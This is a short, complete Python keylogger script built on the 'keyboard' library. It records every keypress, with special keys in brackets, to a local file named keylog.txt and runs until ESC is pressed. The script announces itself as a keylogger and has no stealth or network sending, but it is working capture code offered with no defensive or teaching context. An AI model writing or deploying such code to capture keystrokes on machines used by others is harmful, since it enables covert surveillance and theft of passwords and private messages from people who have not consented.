import keyboard
import os
log_file = "keylog.txt"
def log_keystroke(key_event):
    with open(log_file, "a") as f:
        if key_event.name == "space":
            f.write(" ")
        elif key_event.name == "enter":
            f.write("\n")
        elif len(key_event.name) > 1:
            f.write(f"[{key_event.name}]")
        else:
            f.write(key_event.name)
keyboard.on_press(log_keystroke)
print("Keylogger is running... Press ESC to stop.")
keyboard.wait("esc")